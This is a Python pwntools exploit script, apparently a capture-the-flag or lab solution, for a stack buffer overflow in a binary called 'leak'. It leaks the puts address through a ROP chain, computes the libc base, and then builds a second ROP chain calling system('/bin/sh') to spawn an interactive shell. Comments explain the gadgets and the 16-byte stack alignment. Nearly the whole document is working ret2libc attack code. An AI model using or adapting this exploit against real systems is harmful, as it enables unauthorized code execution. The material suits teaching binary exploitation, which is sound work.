# coding: utf-8

from pwn import *
import struct

'''
$ ldd vuln
        linux-vdso.so.1 (0x00007ffcd37f7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f76e16e7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f76e18c5000)
'''


LOCAL = False

if(LOCAL):
	elf = ELF("./leak")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	p = elf.process()
else:
	elf = ELF("/home/leak")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	p = elf.process()


padding = b"A"*72

'''
─$ ROPgadget --binary ./vuln | grep "pop rdi"                                                 2 ⨯
0x00000000004008f3 : pop rdi ; ret
'''
ropGadget = struct.pack("<Q", 0x00000000004008f3)


putsGOT = elf.got['puts']	#puts in GOT (pass func name => 'puts' into puts to print puts GOT)
putsPLT = elf.plt['puts'] #puts in plt (call puts())
mainFunc = struct.pack("<Q", 0x000000000040082f)	#call main() to continue again


payload = b''.join([
	padding,
	ropGadget,
	p64(putsGOT),
	p64(putsPLT),
	mainFunc
	])

print(p.recvuntil("> ").rstrip())
p.sendline(payload)
leakrecv = p.recvuntil('\n').strip()
print('[*] => ' + str(leakrecv))
leak = u64(leakrecv+(8-len(leakrecv))*b"\x00")	#little endian back the leak address

print("leaked puts() memory address: " + str(hex(leak)))

#calculate libc based address
puts_offset = libc.symbols['puts']
libc_based = leak - puts_offset

print("LIBC based memory address: " + str(hex(libc_based)))

# calculate system & exit memory address with leaked libc based address
# eg: (beginning of memory address of libc) + (position of system function in libc.so)
'''
another technique in finding the offsets & strings:
└─$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system                                   1 ⨯
  1430: 0000000000048db0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
└─$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'                           1 ⨯
 18a156 /bin/sh
'''
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search(b'/bin/sh'))	#getting 1st result from generator

system_address = libc_based + system_offset
exit_address = libc_based + exit_offset
binsh_address = libc_based + binsh_offset

print()
print("system address: " + str(hex(system_address)))
print("exit address: " + str(hex(exit_address)))
print("/bin/sh address: " + str(hex(binsh_address)))

'''
Exploit works on Local but not in Remote Explanation: 
-in the x64 arch, there's some different between ubuntu 16 & 18
-the memory realm runs in 16 bytes boundary
-our payload need to be align in 16 bytes
'''

#ret; address found in vuln binary with ROPgadget (used to fillup the 8 bytes payload to 16bytes)
ret = 0x000000000040028a

#crafting payload
payload = b"".join([
	padding,
	ropGadget,	
	p64(binsh_address),	#16 bytes => pop rdi; ret; + binsh_address
	p64(ret),
	p64(system_address),	#16 bytes => ret; + system_address
	p64(ret),
	p64(exit_address)	#16 bytes => ret; exit_address
	])

#print payload in b64
# print("[*] Final Payload in Base64 Encode")
# print(b64e(payload))

#sending payload spawning shell
p.sendline(payload)
p.interactive()
